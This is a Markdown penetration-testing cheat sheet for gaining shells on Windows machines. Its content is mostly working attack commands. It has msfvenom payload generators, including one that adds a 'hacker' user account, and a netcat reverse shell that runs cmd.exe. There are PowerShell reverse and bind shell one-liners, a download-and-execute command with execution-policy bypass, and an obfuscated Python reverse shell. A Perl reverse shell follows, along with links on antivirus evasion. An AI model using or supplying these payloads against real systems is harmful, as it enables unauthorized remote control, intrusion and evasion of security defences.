# Windows Shells 
Remember to check for AV before uploading common payloads! 
- [ ] Can you exec .NET commands or Powershell as well? 
- [ ] Web Shells 
- [ ] Generate a payload - msfvenom or use nc/socat/powercat
- [ ] Upload payload and invoke 
- [ ] Antivirus evasion 

## Test Connection with ping  
    tcpdump -i [interface] icmp   
    ping 127.0.0.1 
    powershell -c "Test-Connection 127.0.0.1"

## Web Shells 
[White winter wolf Linux and Windows web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) 

[Nishang Invoke-Powershell Script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) 
[ConPty shell](https://github.com/antonioCoco/ConPtyShell)  

## Reverse Shell Commands 
Most likely you will need an exe payload as other payloads aren't usually stable / powershell Execution-Policy is often restricted. 
Generate exe with msfvenom, upload nc, socat, powercat. Find upload point / code execution point to download and execute. 

### File Transfers 
Upload pages, certutil, powershell

    powershell Invoke-WebRequest -Uri http://192.168.119.149:8888/nc.exe -OutFile C:\xampp\htdocs\nc.exe  
    
### Msfvenom 

   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
   msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe	
   msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe	
   msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
   msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
   
   
Add a user in windows with msfvenom: 

    msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
   
### Netcat
upload static binary nc.exe and invoke 


    nc.exe -nv 192.168.119.149 53 -e C:\WINDOWS\system32\cmd.exe 

### Powershell 
[Powershell reverse shell scripts](https://github.com/ivan-sincek/powershell-reverse-tcp)  

    from cmd.exe, run powershell -c "payload"

    $client = New-Object System.Net.Sockets.TCPClient("192.168.119.149",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    
    
    powershell -exec bypass -c "iwr('http://192.168.0.48:8000/Invoke-PowershellTcp.ps1')|iex" 

Bind shell (run on Windows then connect from Kali)

    $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
    
    
### Powercat 
Powershell version of netcat 
[Powercat](https://github.com/besimorhino/powercat)  


### Socat   
[reference](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)   
cmd.exe,pipes

### Python  

    C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 53)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
    
    
### Perl 

    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:53");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'  
    
    
## Antivirus Evasion  
[PHP payload encoder](https://www.gaijin.at/en/tools/php-obfuscator#result) 

[Example - obfuscating payload to get a reverse shell on Windows](https://medium.com/@defsecone/evading-windows-defender-using-obfuscation-techniques-2494b2924807) 


## Resources  
https://github.com/d4t4s3c/Reverse-Shell-Cheat-Sheet

